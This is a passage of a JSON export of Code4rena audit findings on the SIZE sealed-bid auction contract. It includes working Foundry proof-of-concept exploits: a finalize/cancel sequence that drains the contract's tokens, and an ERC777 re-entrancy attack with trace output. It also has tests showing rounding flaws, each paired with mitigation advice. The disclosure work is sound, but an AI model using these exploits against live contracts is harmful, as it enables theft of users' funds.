finalize() was called.  The value is set to max at createAuction. In finalize, it is set again, using user-controlled input:  ``` // Last filled bid is the clearing price a.data.lowestBase = clearingBase; a.data.lowestQuote = clearingQuote; ```  The issue is that it is possible to break the state machine by calling finalize() and setting lowestQuote to `type(uint128).max`. If the other parameters are crafted correctly, finalize() will succeed and perform transfers of unsold base amount and traded quote amount:  ``` // Transfer the left over baseToken if (data.totalBaseAmount != data.filledBase) {     uint128 unsoldBase = data.totalBaseAmount - data.filledBase;     a.params.totalBaseAmount = data.filledBase;     SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), a.data.seller, unsoldBase); } // Calculate quote amount based on clearing price uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase); SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), a.data.seller, filledQuote); ```  Critically, attacker will later be able to call cancelAuction() and cancelBid(), as they are allowed as long as the auction has not finalized:  ``` function cancelAuction(uint256 auctionId) external {     Auction storage a = idToAuction[auctionId];     if (msg.sender != a.data.seller) {         revert UnauthorizedCaller();     }     // Only allow cancellations before finalization     // Equivalent to atState(idToAuction[auctionId], ~STATE_FINALIZED)     if (a.data.lowestQuote != type(uint128).max) {         revert InvalidState();     }     // Allowing bidders to cancel bids (withdraw quote)     // Auction considered forever States.AcceptingBids but nobody can finalize     a.data.seller = address(0);     a.timings.endTimestamp = type(uint32).max;     emit AuctionCancelled(auctionId);     SafeTransferLib.safeTransfer(ERC20(a.params.baseToken), msg.sender, a.params.totalBaseAmount); }  function cancelBid(uint256 auctionId, uint256 bidIndex)     external {     Auction storage a = idToAuction[auctionId];     EncryptedBid storage b = a.bids[bidIndex];     if (msg.sender != b.sender) {         revert UnauthorizedCaller();     }     // Only allow bid cancellations while not finalized or in the reveal period     if (block.timestamp >= a.timings.endTimestamp) {         if (a.data.lowestQuote != type(uint128).max || block.timestamp <= a.timings.endTimestamp + 24 hours) {             revert InvalidState();         }     }     // Prevent any futher access to this EncryptedBid     b.sender = address(0);     // Prevent seller from finalizing a cancelled bid     b.commitment = 0;     emit BidCancelled(auctionId, bidIndex);     SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, b.quoteAmount); } ```  The attack will look as follows:  1.  attacker uses two contracts - buyer and seller 2.  seller creates an auction, with no vesting period and ends in 1 second. Passes X base tokens. 3.  buyer bids on the auction, using baseAmount=quoteAmount (ratio is 1:1). Passes Y quote tokens, where Y < X. 4.  after 1 second, seller calls reveal() and finalizes, with **lowestQuote = lowestBase = 2\\*\\*128-1**. 5.  seller contract receives X-Y unsold base tokens and Y quote tokens 6.  seller calls cancelAuction(). They are sent back remaining totalBaseAmount, which is X - (X-Y) = Y base tokens. They now have the same amount of base tokens they started with. cancelAuction sets endTimestamp = `type(uint32).max` 7.  buyer calls cancelBid. Because endTimestamp is set to max, the call succeeds. Buyer gets back Y quote tokens. 8.  The accounting shows attacker profited Y quote tokens, which are both in buyer and seller's contract.  Note that the values of `minimumBidQuote`, `reserveQuotePerbase` must be carefully chosen to satisfy all the inequality requirements in createAuction(), bid() and finalize(). This is why merely spotting that lowestQuote may be set to max in finalize is not enough and in my opinion, POC-ing the entire flow is necessary for a valid finding.  This was the main constraint to bypass:  ``` uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount); ... data.previousQuotePerBase = quotePerBase; ... if (data.previousQuotePerBase != FixedPointMathLib.mulDivDown(clearingQuote, type(uint128).max, clearingBase)) {             revert InvalidCalldata();         } ```  Since clearingQuote must equal UINT128_MAX, we must satisfy: (2\\*\\*128-1) \\* (2\\*\\*128-1) / clearingBase = quoteAmount \\* (2\\*\\*128-1) / baseAmount. The solution I found was setting clearingBase to (2\\*\\*128-1) and quoteAmount = baseAmount.  We also have constraints on reserveQuotePerBase. In createAuction:  ``` if (     FixedPointMathLib.mulDivDown(         auctionParams.minimumBidQuote, type(uint128).max, auctionParams.totalBaseAmount     ) > auctionParams.reserveQuotePerBase ) {     revert InvalidReserve(); } ```  While in finalize():  ``` // Only fill if above reserve price if (quotePerBase < data.reserveQuotePerBase) continue; ```  And an important constraint on quoteAmount and minimumBidQuote:  ``` if (quoteAmount == 0 || quoteAmount == type(uint128).max || quoteAmount < a.params.minimumBidQuote) {     revert InvalidBidAmount(); } ```  Merging them gives us two equations to substitute variables in:  1.  `minimumBidQuote / totalBaseAmount < reserveQuotePerBase <= UINT128_MAX / clearingBase` 2.  `quoteAmount > minimumBidQuote`  In the POC I've crafted parameters to steal 2**30 quote tokens, around 1000 in USDC denomination. With the above equations, increasing or decreasing the stolen amount is simple.  ## Impact  An attacker can steal all tokens held in the SIZE auction contract.  ## Proof of Concept  Copy the following code in SizeSealed.t.sol  ``` function testAttack() public {     quoteToken = new MockERC20(\"USD Coin\", \"USDC\", 6);     baseToken = new MockERC20(\"DAI stablecoin \", \"DAI\", 18);     // Bootstrap auction contract with some funds     baseToken.mint(address(auction), 1e20);     quoteToken.mint(address(auction), 1e12);     // Create attacker     MockSeller attacker_seller  = new MockSeller(address(auction), quoteToken, baseToken);     MockBuyer attacker_buyer = new MockBuyer(address(auction), quoteToken, baseToken);     // Print attacker balances     uint256 balance_quote;     uint256 balance_base;     (balance_quote, balance_base) = attacker_seller.balances();     console.log(\"Starting seller balance: \", balance_quote, balance_base);     (balance_quote, balance_base) = attacker_buyer.balances();     console.log('Starting buyer balance: ', balance_quote, balance_base);     // Create auction     uint256 auction_id = attacker_seller.createAuction(         2**32,  // totalBaseAmount         2**120, // reserveQuotePerBase         2**20, // minimumBidQuote         uint32(block.timestamp), // startTimestamp         uint32(block.timestamp + 1),  // endTimestamp         uint32(block.timestamp + 1), // vestingStartTimestamp         uint32(block.timestamp + 1), // vestingEndTimestamp         0 // cliffPercent     );     // Bid on auction     attacker_buyer.setAuctionId(auction_id);     attacker_buyer.bidOnAuction(         2**30, // baseAmount         2**30  // quoteAmount     );     // Finalize with clearingQuote = clearingBase = 2**128-1     // Will transfer unsold base amount + matched quote amount     uint256[] memory bidIndices = new uint[](1);     bidIndices[0] = 0;     vm.warp(block.timestamp + 10);     attacker_seller.finalize(bidIndices, 2**128-1, 2**128-1);     // Cancel auction     // Will transfer back sold base amount     attacker_seller.cancelAuction();     // Cancel bid     // Will transfer back to buyer quoteAmount     attacker_buyer.cancel();     // Net profit of quoteAmount tokens of quoteToken     (balance_quote, balance_base) = attacker_seller.balances();     console.log(\"End seller balance: \", balance_quote, balance_base);     (balance_quote, balance_base) = attacker_buyer.balances();     console.log('End buyer balance: ', balance_quote, balance_base); } ```  ## Tools Used  Manual audit, foundry tests  ## Recommended Mitigation Steps  Do not trust the value of `lowestQuote` when determining the finalize state, use a dedicated state variable for it."}, {"title": "Seller suffers a severe underpricing of the sold base tokens due to attacker griefing", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/243", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "sponsor disputed", "Q-15"], "target": "2022-11-size-findings", "body": "Seller suffers a severe underpricing of the sold base tokens due to attacker griefing"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/239", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "edited-by-warden", "Q-14"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Attacker may DOS auctions using invalid bid parameters", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/237", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "duplicate-64", "M-06"], "target": "2022-11-size-findings", "body": "Attacker may DOS auctions using invalid bid parameters"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/229", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-21"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/216", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-20"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/215", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-13"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/211", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-19"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Seller's ability to decrypt bids before reveal could result in a much higher clearing price than anticpated and make buyers distrust the system", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/194", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "selected for report", "duplicate-170", "M-05"], "target": "2022-11-size-findings", "body": "Seller's ability to decrypt bids before reveal could result in a much higher clearing price than anticpated and make buyers distrust the system"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/193", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-12"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Auction created by ERC777 Tokens with tax can be stolen by re-entrancy attack", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/192", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "sponsor confirmed", "M-04"], "target": "2022-11-size-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-size/blob/main/src/SizeSealed.sol#L96-L102   # Vulnerability details  ## Impact The createAuction function lacks the check of re-entrancy. An attacker can use an ERC777 token with tax as the base token to create auctions. By registering ERC777TokensSender interface implementer in the ERC1820Registry contract, the attacker can re-enter the createAuction function and create more than one auction with less token. And the sum of the totalBaseAmount of these auctions will be greater than the token amount received by the SizeSealed contract. Finally, the attacker can take more money from the contract global pool which means stealing tokens from the other auctions and treasury.  ## Proof of Concept Forge test  ``` // SPDX-License-Identifier: GPL-3.0 pragma solidity 0.8.17;  import {Test} from \"forge-std/Test.sol\";  import {SizeSealedTest} from \"./SizeSealed.t.sol\"; import {ERC777} from \"openzeppelin-contracts/contracts/token/ERC777/ERC777.sol\"; import \"openzeppelin-contracts/contracts/utils/introspection/IERC1820Registry.sol\"; import {MockSeller} from \"./mocks/MockSeller.sol\"; import {MockERC20} from \"./mocks/MockERC20.sol\";  contract TaxERC777 is ERC777{     uint32 tax = 50; // 50% tax rate      constructor(string memory name_,         string memory symbol_,         address[] memory defaultOperators_) ERC777(name_, symbol_, defaultOperators_){}          function mint(address rec, uint256 amount) external{         super._mint(rec, amount, \"\", \"\", false);     }      function _beforeTokenTransfer(         address operator,         address from,         address to,         uint256 amount     ) internal override {         if(to == address(0)||from==address(0)){ return;}         // tax just burn for test              }      function _send(         address from,         address to,         uint256 amount,         bytes memory userData,         bytes memory operatorData,         bool requireReceptionAck     ) internal override {         uint tax_amount = amount* tax / 100;         _burn(from, tax_amount, \"\", \"\");         super._send(from, to, amount-tax_amount, userData, operatorData, requireReceptionAck);     }  }  contract Callback {     MockSeller seller;     uint128 baseToSell;      uint256 reserveQuotePerBase = 0.5e6 * uint256(type(uint128).max) / 1e18;     uint128 minimumBidQuote = 1e6;     // Auction parameters (cliff unlock)     uint32 startTime;     uint32 endTime;     uint32 unlockTime;     uint32 unlockEnd;     uint128 cliffPercent;      uint8 entry = 0;     uint128 amount_cut_tax;     constructor(MockSeller _seller, uint128 _baseToSell, uint256 _reserveQuotePerBase, uint128 _minimumBidQuote, uint32 _startTime, uint32 _endTime, uint32 _unlockTime, uint32 _unlockEnd, uint128 _cliffPercent){         seller = _seller;         baseToSell = _baseToSell;         reserveQuotePerBase = _reserveQuotePerBase;         minimumBidQuote = _minimumBidQuote;         startTime = _startTime;         endTime = _endTime;         unlockTime = _unlockTime;         unlockEnd = _unlockEnd;         cliffPercent = _cliffPercent;     }     function tokensToSend(address operator, address from, address to, uint256 amount, bytes calldata userData, bytes calldata operatorData) external{         if(from==address(0) || to==address(0)){return;}         if(entry == 0){             entry += 1;             amount_cut_tax = baseToSell / 2;             seller.createAuction(                 amount_cut_tax, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent             );             return;         }         else if(entry == 1){             entry += 1;             ERC777(msg.sender).transferFrom(from, to, amount_cut_tax);             return;         }         entry += 1;         return;              }     function canImplementInterfaceForAddress(bytes32 interfaceHash, address addr) external view returns(bytes32){return keccak256(abi.encodePacked(\"ERC1820_ACCEPT_MAGIC\"));} }  contract MyTest is SizeSealedTest {          IERC1820Registry internal constant _ERC1820_REGISTRY = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);     function testCreateAuctionFromErc777() public {         TaxERC777 tax777Token;         address[] memory addrme = new address[](1);         addrme[0] = address(this);         tax777Token = new TaxERC777(\"t7\", \"t7\", addrme);                  seller = new MockSeller(address(auction), quoteToken, MockERC20(address(tax777Token)));         Callback callbackImpl = new Callback(seller, baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent);          // just without adding more function to MockSeller         vm.startPrank(address(seller));         _ERC1820_REGISTRY.setInterfaceImplementer(address(seller), keccak256(\"ERC777TokensSender\"), address(callbackImpl));         tax777Token.approve(address(callbackImpl), type(uint256).max);         vm.stopPrank();         seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );         uint auction_balance = tax777Token.balanceOf(address(auction));         uint128 auction1_amount = get_auction_base_amount(1);         uint128 auction2_amount = get_auction_base_amount(2);         emit log_named_uint(\"auction balance\", auction_balance);         emit log_named_uint(\"auction 1 totalBaseAmount\", auction1_amount);         emit log_named_uint(\"auction 2 totalBaseAmount\", auction2_amount);         assertGt(auction1_amount+auction2_amount, auction_balance);     }      function get_auction_base_amount(uint id) private returns (uint128){         (, ,AuctionParameters memory para) = auction.idToAuction(id);         return para.totalBaseAmount;     } } ```  You should fork mainnet because the test needs to call the ERC1820Registry contract at `0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24` ``` forge test --match-test testCreateAuctionFromErc777 -vvvvv --fork-url XXXXXXXX ```  Test passed and print logs: ``` ... ...     \u251c\u2500 [4900] SizeSealed::idToAuction(1) [staticcall]     \u2502   \u2514\u2500 \u2190 (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 10000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))     \u251c\u2500 [4900] SizeSealed::idToAuction(2) [staticcall]     \u2502   \u2514\u2500 \u2190 (1657269193, 1657269253, 1657269293, 1657270193, 0), (0xbfFb01bB2DDb4EfA87cB78EeCB8115AFAe6d2032, 0, 340282366920938463463374607431768211455, 0), (0x3A1148FE01e3c4721D93fe8A36c2b5C29109B6ae, 0xCe71065D4017F316EC606Fe4422e11eB2c47c246, 170141183460469231731687303, 5000000000000000000, 1000000, 0x0000000000000000000000000000000000000000000000000000000000000000, (9128267825790407824510503980134927506541852140766882823704734293547670668960, 16146712025506556794526643103432719420453319699545331060391615514163464043902))     \u251c\u2500 emit log_named_uint(key: auction balance, val: 10000000000000000000)     \u251c\u2500 emit log_named_uint(key: auction 1 totalBaseAmount, val: 10000000000000000000)     \u251c\u2500 emit log_named_uint(key: auction 2 totalBaseAmount, val: 5000000000000000000)     \u2514\u2500 \u2190 ()  Test result: ok. 1 passed; 0 failed; finished in 7.64s ```  ## Tools Used  foundry  ## Recommended Mitigation Steps check re-entrancy"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/187", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-18"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/184", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-11"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/183", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-10"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/182", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-17"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/174", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-09"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/160", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-16"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/157", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-15"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/155", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-14"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/153", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-08"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/139", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-13"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/133", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-12"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/111", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-11"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/108", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-07"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Risk of infomation leakage due to bid with plain quote amount as input parameter", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/103", "labels": ["bug", "downgraded by judge", "grade-b", "QA (Quality Assurance)", "edited-by-warden", "Q-06"], "target": "2022-11-size-findings", "body": "Risk of infomation leakage due to bid with plain quote amount as input parameter"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/99", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-10"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "The sorting logic is not strict enough", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/97", "labels": ["bug", "2 (Med Risk)", "satisfactory", "selected for report", "sponsor confirmed", "M-03"], "target": "2022-11-size-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L277   # Vulnerability details  ## Impact When the seller finalizes his auction, all bids are sorted according to the `quotePerBase` and it's calculated using the `FixedPointMathLib.mulDivDown()`.  And the earliest bid will be used first for the same `quotePerBase` but this ratio is not strict enough so that the worse bid might be filled than the better one.  As a result, the seller might receive fewer quote token than he wants.  ## Proof of Concept This is the test to show the scenario.  ```solidity     function testAuditWrongSorting() public {         // this test will show that it is possible the seller can not claim the best bid because of the inaccurate comparison in finalization         uint128 K = 1<<64;         baseToSell = K + 2;         uint256 aid = seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );          bidder1.setAuctionId(aid);         bidder1.bidOnAuctionWithSalt(K+1, K, \"Worse bidder\");         bidder2.setAuctionId(aid);         bidder2.bidOnAuctionWithSalt(K+2, K+1, \"Better bidder\"); // This is the better bid because (K+1)/(K+2) > K/(K+1)          vm.warp(endTime);          uint256[] memory bidIndices = new uint[](2);         bidIndices[0] = 1; // the seller is smart enough to choose the correct order to (1, 0)         bidIndices[1] = 0;          vm.expectRevert(ISizeSealed.InvalidSorting.selector);         seller.finalize(bidIndices, K+2, K+1); // this reverts because of #273          // next the seller is forced to call the finalize with parameter K+1, K preferring the first bidder         bidIndices[0] = 0;         bidIndices[1] = 1;         seller.finalize(bidIndices, K+1, K);          // at this point the seller gets K quote tokens while he could get K+1 quote tokens with the better bidder         assertEq(quoteToken.balanceOf(address(seller)), K);     } ```  This is the output of the test.  ```solidity     Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest     [PASS] testAuditWrongSorting() (gas: 984991)     Test result: ok. 1 passed; 0 failed; finished in 7.22ms ```  When it calculates the [quotePerBase](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269), they are same each other with `(base, quote) = (K+1, K) and (K+2, K+1) when K = 1<<64`.  So the seller can receive `K+1` of the quote token but he got `K`.  I think `K` is realistic enough with the 18 decimals token because K is around 18 * 1e18.  ## Tools Used Foundry  ## Recommended Mitigation Steps As we can see from the test, it's not strict enough to compare bidders using `quotePerBase`.  We can compare them by multiplying them like below.  $\\frac {quote1}{base1} >= \\frac{quote2}{base2} <=> quote1 * base2 >= quote2 * base1 $  So we can add 2 elements to `FinalizeData` struct and modify [this comparison](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L269-L277) like below.  ```solidity     struct FinalizeData {         uint256 reserveQuotePerBase;         uint128 totalBaseAmount;         uint128 filledBase;         uint256 previousQuotePerBase;         uint256 previousIndex;         uint128 previousQuote; //++++++++++++         uint128 previousBase; //+++++++++++     } ```  ```solidity     uint256 quotePerBase = FixedPointMathLib.mulDivDown(b.quoteAmount, type(uint128).max, baseAmount);     if (quotePerBase >= data.previousQuotePerBase) {         // If last bid was the same price, make sure we filled the earliest bid first         if (quotePerBase == data.previousQuotePerBase) {             uint256 currentMult = uint256(b.quoteAmount) * data.previousBase; //mult for current bid             uint256 previousMult = uint256(data.previousQuote) * baseAmount; //mult for the previous bid              if (currentMult > previousMult) { // current bid is better                 revert InvalidSorting();                 }              if (currentMult == previousMult && data.previousIndex > bidIndex) revert InvalidSorting();         } else {             revert InvalidSorting();         }     }      ...      data.previousBase = baseAmount;     data.previousQuote = b.quoteAmount; ```"}, {"title": "Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn't have enough balance.", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/94", "labels": ["bug", "3 (High Risk)", "primary issue", "satisfactory", "selected for report", "sponsor confirmed", "H-01"], "target": "2022-11-size-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325   # Vulnerability details  ## Impact Bidders might fail to withdraw their unused funds after the auction was finalized because the contract doesn't have enough balance.  The main flaw is the seller might receive more quote tokens than the bidders offer after the auction was finalized.  If there is no other auctions to use the same quote token, the last bidder will fail to withdraw his funds because the contract doesn't have enough balance of quote token.  ## Proof of Concept After the auction was finalized, the seller receives the `filledQuote` amount of quote token using [data.filledBase](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L325).  ```solidity     // Calculate quote amount based on clearing price     uint256 filledQuote = FixedPointMathLib.mulDivDown(clearingQuote, data.filledBase, clearingBase); ```  But when the bidders withdraw the funds using `withdraw()`, they offer the quote token [using this formula](https://github.com/code-423n4/2022-11-size/blob/706a77e585d0852eae6ba0dca73dc73eb37f8fb6/src/SizeSealed.sol#L375-L382).  ```solidity     // Refund unfilled quoteAmount on first withdraw     if (b.quoteAmount != 0) {         uint256 quoteBought = FixedPointMathLib.mulDivDown(baseAmount, a.data.lowestQuote, a.data.lowestBase);         uint256 refundedQuote = b.quoteAmount - quoteBought;         b.quoteAmount = 0;          SafeTransferLib.safeTransfer(ERC20(a.params.quoteToken), msg.sender, refundedQuote);     } ```  Even if they use the same clearing price, the total amount of quote token that the bidders offer might be less than the amount that the seller charged during finalization because the round down would happen several times with the bidders.  This is the test to show the scenario.  ```solidity     function testAuditBidderMoneyLock() public {         // in this scenario, we show that bidder's money can be locked due to inaccurate calculation of claimed quote tokens for a seller         uint128 K = 1 ether;         baseToSell = 4*K;         uint256 aid = seller.createAuction(             baseToSell, reserveQuotePerBase, minimumBidQuote, startTime, endTime, unlockTime, unlockEnd, cliffPercent         );          bidder1.setAuctionId(aid);         bidder1.bidOnAuctionWithSalt(3*K, 3*K+2, \"Honest bidder\");         bidder2.setAuctionId(aid);         bidder2.bidOnAuctionWithSalt(2*K, 2*K+1, \"Honest bidder\");          vm.warp(endTime);          uint256[] memory bidIndices = new uint[](2);         bidIndices[0] = 0;         bidIndices[1] = 1;          seller.finalize(bidIndices, 2*K, 2*K+1);         emit log_string(\"Seller claimed\");         // seller claimed 4*K+2         assertEq(quoteToken.balanceOf(address(seller)), 4*K+2);         // contract has K+1 quote token left         assertEq(quoteToken.balanceOf(address(auction)), K+1);          // bidder1 withdraws         bidder1.withdraw();         emit log_string(\"Bidder 1 withdrew\");         // contract has K quote token left         assertEq(quoteToken.balanceOf(address(auction)), K);         // bidder2 withdraws and he is supposed to be able to claim K+1 quote tokens         // but the protocol reverts because of insufficient quote tokens         bidder2.withdraw();         emit log_string(\"Bidder 2 withdrew\"); // will not happen     } ```  The test result shows the seller charged more quote token than the bidders offer so the last bidder can't withdraw his unused quote token because the contract doesn't have enough balance.  ```solidity     Running 1 test for src/test/SizeSealed.t.sol:SizeSealedTest     [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985)     Logs:     Seller claimed     Bidder 1 withdrew      Test result: FAILED. 0 passed; 1 failed; finished in 6.94ms      Failing tests:     Encountered 1 failing test in src/test/SizeSealed.t.sol:SizeSealedTest     [FAIL. Reason: TRANSFER_FAILED] testAuditBidderMoneyLock() (gas: 954985) ```  ## Tools Used Foundry  ## Recommended Mitigation Steps Currently, the `FinalizeData` struct contains the `filledBase` only and calculates the `filledQuote` using the clearing price.  ```solidity     struct FinalizeData {         uint256 reserveQuotePerBase;         uint128 totalBaseAmount;         uint128 filledBase;         uint256 previousQuotePerBase;         uint256 previousIndex;     } ```  I think we should add one more field `filledQuote` and update it during auction finalization.  And the seller can recieve the sum of `filledQuote` of all bidders to avoid the rounding issue.  Also, each bidder can pay the `filledQuote` of quote token and receive the `filledBase` of base token without calculating again using the clearing price."}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/91", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-09"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/88", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-08"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/83", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "edited-by-warden", "Q-05"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/74", "labels": ["bug", "G (Gas Optimization)", "grade-b", "edited-by-warden", "G-07"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/62", "labels": ["bug", "grade-b", "QA (Quality Assurance)", "Q-04"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/61", "labels": ["bug", "G (Gas Optimization)", "grade-b", "G-06"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/57", "labels": ["bug", "grade-a", "QA (Quality Assurance)", "selected for report", "Q-03"], "target": "2022-11-size-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/56", "labels": ["bug", "G (Gas Optimization)", "grade-a", "selected for report", "G-05"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/52", "labels": ["bug", "G (Gas Optimization)", "grade-a", "G-04"], "target": "2022-11-size-findings", "body": "Gas Optimizations"}, {"title": "Solmate's ERC20 does not check for token contract's existence, which opens up possibility for a honeypot attack", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/48", "labels": ["bug", "2 (Med Risk)", "downgraded by judge", "satisfactory", "selected for report", "edited-by-warden", "duplicate-318", "M-02"], "target": "2022-11-size-findings", "body": "Solmate's ERC20 does not check for token contract's existence, which opens up possibility for a honeypot attack"}, {"title": "Incompatibility with fee-on-transfer/inflationary/deflationary/rebasing tokens, on both base tokens and quote tokens, with varying impacts", "html_url": "https://github.com/code-423n4/2022-11-size-findings/issues/47", "labels": ["bug", "2 (Med Risk)", "selected for report", "edited-by-warden", "duplicate-255", "M-01"], "target": 